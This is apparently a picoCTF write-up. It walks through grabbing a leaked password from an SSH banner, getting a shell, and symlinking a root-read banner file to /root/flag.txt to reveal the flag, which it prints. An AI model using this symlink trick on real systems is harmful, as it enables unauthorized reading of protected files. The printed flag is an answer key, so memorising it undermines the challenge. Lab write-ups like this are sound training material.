# dont-you-love-banners

Link to the challenge: https://play.picoctf.org/practice/challenge/437

## Description

Can you abuse the banner?
The server has been leaking some crucial information on `tethys.picoctf.net 52473`. Use the leaked information to get to the server.
To connect to the running application use `nc tethys.picoctf.net 59356`. From the above information abuse the machine and find the flag in the `/root` directory.

### Note that you may receive different port numbers.

# Solution

## Getting shell access

Let's start by connecting to `tethys.picoctf.net 59356`

```
$ nc tethys.picoctf.net 59356
*************************************
**************WELCOME****************
*************************************

what is the password?
random_guess
Lol, good try, try again and good luck
```

Upon connection, we're greeted with a welcome banner and prompted for a password. Trying a random guess yields no success. Since we don't know the password, our next step is to connect to `tethys.picoctf.net 52473` to see if we can uncover any useful information there.

```
$ nc tethys.picoctf.net 52473
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

This server leaks the password we need!

Armed with the correct password, we reconnect to `tethys.picoctf.net 59356`and provide the password. We're then asked two questions about cybersecurity, the answers to which we can find on the Internet or by asking LLM.

```
$ nc tethys.picoctf.net 59356
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

Answering these questions correctly grants us shell access.

## Exploring the `/root` directory

The description suggests to look inside the `/root` directory.

```
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar 12 00:18 .
drwxr-xr-x 1 root root   29 Jul  4 12:33 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12 00:18 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
```

Listing the contents of this directory, we find several files, including a `flag.txt` which is inaccessible due to permissions. However, we can read a script named `script.py`.

```
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

## Exploit

Examining the script reveals that upon connection, the server displays a banner from the `/home/player/banner` file. Since this part of the code is executed with root permissions, it has access to read the `flag.txt` file. We can exploit this by creating a symbolic link from `/home/player/banner` to `/root/flag.txt` .

Executing this clever trick means that the next time we connect, the contents of `/root/flag.txt` will be displayed as the banner.

```
player@challenge:~$ mv banner banner.orig
mv banner banner.orig
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   39 Jul  4 12:55 .
drwxr-xr-x 1 root   root     20 Mar  9 16:39 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
lrwxrwxrwx 1 player player   14 Jul  4 12:55 banner -> /root/flag.txt
-rw-r--r-- 1 player player  114 Feb  7 17:25 banner.orig
-rw-r--r-- 1 root   root     13 Feb  7 17:25 text
```

Finally, we reconnect to `tethys.picoctf.net 59356`.

```
player@challenge:~$ ^C
$ nc tethys.picoctf.net 59356
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}

what is the password?
$ ^C
```

And there it is — the flag displayed as the banner!

### Flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}